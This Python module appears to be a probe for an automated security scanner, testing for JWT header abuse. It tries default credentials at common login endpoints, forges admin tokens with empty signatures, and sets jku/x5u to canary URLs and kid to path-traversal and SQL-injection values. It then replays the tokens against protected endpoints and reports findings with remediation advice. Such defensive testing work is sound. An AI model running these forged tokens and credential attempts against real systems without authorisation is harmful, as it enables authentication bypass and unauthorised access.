"""JWT jku/x5u SSRF and kid-injection probe.

Three-way probe for JWT header abuses that map to full auth bypass:

1. `jku` (JWK Set URL) pointing at an attacker host. A naive verifier
   fetches the JWKS, picks the matching kid, and verifies. The forged
   token then claims any role.

2. `x5u` (X.509 URL) variant, same mechanism with a cert chain.

3. `kid` injection: path traversal (`../../../dev/null`) or SQL
   injection (`'OR'1'='1`). Both target verifier code that trusts kid
   as a path or DB lookup.

The probe needs an existing JWT to know the alg and basic shape, so it
attempts a login first against well-known endpoints. If no JWT is in
hand, it skips: forging from scratch is too noisy for a generic probe.

Detection: 200 with admin-shape body = critical (auth bypass). 500 with
"kid", "jku", or "x5u" in the trace = medium (parser exposure).
"""
from __future__ import annotations

import base64
import json
from typing import Any

from engine.probes import ProbeContext, registry
from engine.probes.primitives import http_get, http_post_json

JKU_CANARY = "https://ptai-jku-canary.example/.well-known/jwks.json"
X5U_CANARY = "https://ptai-x5u-canary.example/cert.pem"

# Endpoints that commonly hand out a JWT on credentialed login.
LOGIN_ENDPOINTS: tuple[str, ...] = (
    "/rest/user/login",
    "/api/auth/login",
    "/api/login",
    "/login",
)

# Endpoints that gate on a JWT and reveal the caller's identity.
PROTECTED_ENDPOINTS: tuple[str, ...] = (
    "/me",
    "/api/users/me",
    "/api/me",
    "/api/profile",
    "/rest/user/whoami",
    "/api/account",
)

# Throwaway probe credentials. Many staging instances seed these accounts.
LOGIN_CREDS: tuple[dict[str, str], ...] = (
    {"email": "test@test.com", "password": "test"},
    {"email": "admin@admin.com", "password": "admin"},
    {"username": "test", "password": "test"},
)

ADMIN_HINTS: tuple[str, ...] = ("admin", "role", "isadmin", "is_admin", "superuser")
KID_TRACE_HINTS: tuple[str, ...] = ("kid", "jku", "x5u", "jwks")


def _b64url(blob: bytes) -> str:
    return base64.urlsafe_b64encode(blob).rstrip(b"=").decode("ascii")


def _b64url_decode(part: str) -> bytes:
    pad = "=" * (-len(part) % 4)
    return base64.urlsafe_b64decode(part + pad)


def _parse_jwt(token: str) -> tuple[dict[str, Any], dict[str, Any]] | None:
    """Return (header, payload) from a JWT, or None on parse failure."""
    parts = token.split(".")
    if len(parts) != 3:
        return None
    try:
        header = json.loads(_b64url_decode(parts[0]))
        payload = json.loads(_b64url_decode(parts[1]))
    except (ValueError, json.JSONDecodeError, UnicodeDecodeError):
        return None
    if not isinstance(header, dict) or not isinstance(payload, dict):
        return None
    return header, payload


def _forge_jwt(header: dict[str, Any], payload: dict[str, Any]) -> str:
    """Forge a token with empty signature. Sufficient for jku/x5u/kid tests."""
    h_b = _b64url(json.dumps(header, separators=(",", ":")).encode())
    p_b = _b64url(json.dumps(payload, separators=(",", ":")).encode())
    return f"{h_b}.{p_b}."


def _extract_jwt(body: str, headers: dict[str, str]) -> str | None:
    """Pull a JWT out of a JSON body or Authorization header."""
    if headers:
        auth = headers.get("Authorization", "")
        if auth.lower().startswith("bearer "):
            candidate = auth.split(" ", 1)[1].strip()
            if candidate.count(".") == 2:
                return candidate
    if not body:
        return None
    try:
        parsed = json.loads(body)
    except (ValueError, TypeError):
        return None
    return _walk_for_jwt(parsed)


def _walk_for_jwt(blob: Any) -> str | None:
    if isinstance(blob, str):
        if blob.count(".") == 2 and len(blob) > 40 and blob.startswith("ey"):
            return blob
        return None
    if isinstance(blob, dict):
        for key in ("token", "access_token", "jwt", "authentication", "id_token"):
            val = blob.get(key)
            found = _walk_for_jwt(val) if val is not None else None
            if found:
                return found
        for value in blob.values():
            found = _walk_for_jwt(value)
            if found:
                return found
    elif isinstance(blob, list):
        for item in blob:
            found = _walk_for_jwt(item)
            if found:
                return found
    return None


async def _try_capture_jwt(ctx: ProbeContext) -> str | None:
    """Best-effort JWT capture. Returns a token string or None."""
    if ctx.captured_auth:
        token = ctx.captured_auth.get("token") or ctx.captured_auth.get("jwt")
        if isinstance(token, str) and token.count(".") == 2:
            return token
    for path in LOGIN_ENDPOINTS:
        url = ctx.base + path
        for creds in LOGIN_CREDS:
            status, headers, body = await http_post_json(ctx.session, url, creds)
            if status not in (200, 201):
                continue
            tok = _extract_jwt(body, headers)
            if tok:
                return tok
    return None


def _looks_like_admin(body: str) -> bool:
    if not body:
        return False
    lowered = body.lower()
    return any(hint in lowered for hint in ADMIN_HINTS)


def _looks_like_parser_trace(status: int, body: str) -> bool:
    if status < 500:
        return False
    if not body:
        return False
    lowered = body.lower()
    return any(hint in lowered for hint in KID_TRACE_HINTS)


def _emit_bypass(target: str, variant: str, evidence: str) -> dict[str, Any]:
    return {
        "title": f"JWT auth bypass via {variant}",
        "severity": "critical",
        "category": "authentication",
        "target": target,
        "evidence": evidence[:512],
        "bug_class": "auth_bypass",
        "remediation": (
            "Pin verifier to a static JWKS or embedded public key. Reject "
            "tokens whose header carries jku, x5u, or kid values that are not "
            "on a server-side allowlist. Treat kid as an opaque identifier, "
            "never as a filesystem path or unparameterised SQL fragment."
        ),
    }


def _emit_parser_leak(target: str, variant: str, evidence: str) -> dict[str, Any]:
    return {
        "title": f"JWT parser stack trace leak via {variant}",
        "severity": "medium",
        "category": "information-disclosure",
        "target": target,
        "evidence": evidence[:512],
        "bug_class": "auth_bypass",
        "remediation": (
            "Catch verifier exceptions and return an opaque 401. Do not echo "
            "kid, jku, or x5u values back in error responses or stack traces."
        ),
    }


def _build_variants(
    base_header: dict[str, Any], base_payload: dict[str, Any]
) -> list[tuple[str, str]]:
    """Build (variant_name, forged_jwt) pairs."""
    admin_payload = dict(base_payload)
    admin_payload["sub"] = "admin"
    admin_payload["role"] = "admin"
    admin_payload["isAdmin"] = True

    variants: list[tuple[str, str]] = []

    h_jku = dict(base_header)
    h_jku["alg"] = "RS256"
    h_jku["jku"] = JKU_CANARY
    variants.append(("jku_ssrf", _forge_jwt(h_jku, admin_payload)))

    h_x5u = dict(base_header)
    h_x5u["alg"] = "RS256"
    h_x5u["x5u"] = X5U_CANARY
    variants.append(("x5u_ssrf", _forge_jwt(h_x5u, admin_payload)))

    h_kid_path = dict(base_header)
    h_kid_path["alg"] = "HS256"
    h_kid_path["kid"] = "../../../dev/null"
    variants.append(("kid_path_traversal", _forge_jwt(h_kid_path, admin_payload)))

    h_kid_sqli = dict(base_header)
    h_kid_sqli["alg"] = "HS256"
    h_kid_sqli["kid"] = "' OR '1'='1"
    variants.append(("kid_sql_injection", _forge_jwt(h_kid_sqli, admin_payload)))

    return variants


@registry.probe(
    name="web.jwt_jku_x5u_ssrf",
    bug_class="auth_bypass",
    severity_max="critical",
    owasp="A07:2021",
    runtime_budget_s=12.0,
    tags=("anonymous", "high-roi"),
    requires_auth=False,
)
async def probe_jwt_jku_x5u_ssrf(ctx: ProbeContext) -> list[dict[str, Any]]:
    """Forge JWT header variants and replay against protected endpoints."""
    token = await _try_capture_jwt(ctx)
    if token is None:
        return []

    parsed = _parse_jwt(token)
    if parsed is None:
        return []
    base_header, base_payload = parsed

    variants = _build_variants(base_header, base_payload)
    findings: list[dict[str, Any]] = []
    seen: set[tuple[str, str]] = set()

    for path in PROTECTED_ENDPOINTS:
        url = ctx.base + path
        for variant, forged in variants:
            status, _hdrs, body = await http_get(
                ctx.session, url, headers={"Authorization": f"Bearer {forged}"}
            )
            key = (url, variant)
            if key in seen:
                continue
            if status == 200 and _looks_like_admin(body):
                seen.add(key)
                findings.append(
                    _emit_bypass(
                        url,
                        variant,
                        f"status=200 body_excerpt={body[:200]!r}",
                    )
                )
                continue
            if _looks_like_parser_trace(status, body):
                seen.add(key)
                findings.append(
                    _emit_parser_leak(
                        url,
                        variant,
                        f"status={status} body_excerpt={body[:200]!r}",
                    )
                )

    return findings
